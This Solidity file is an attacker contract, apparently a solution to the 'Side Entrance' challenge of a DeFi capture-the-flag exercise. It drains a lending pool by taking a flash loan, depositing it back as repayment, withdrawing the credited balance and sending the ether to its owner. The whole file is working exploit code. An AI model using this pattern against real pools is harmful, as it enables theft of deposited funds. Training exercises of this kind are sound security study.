// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import {IFlashLoanEtherReceiver} from "../SideEntranceLenderPool.sol";

/**
 * @title AttackerC4
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC4 is IFlashLoanEtherReceiver {
    using Address for address;

    address immutable owner;
    address immutable pool;

    constructor(address _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function exploit() external {
        require(msg.sender == owner);
        pool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", pool.balance));
        pool.functionCall(abi.encodeWithSignature("withdraw()"));
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external override payable {
        require(msg.sender == pool);
        msg.sender.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
    }

    receive() external payable { }
}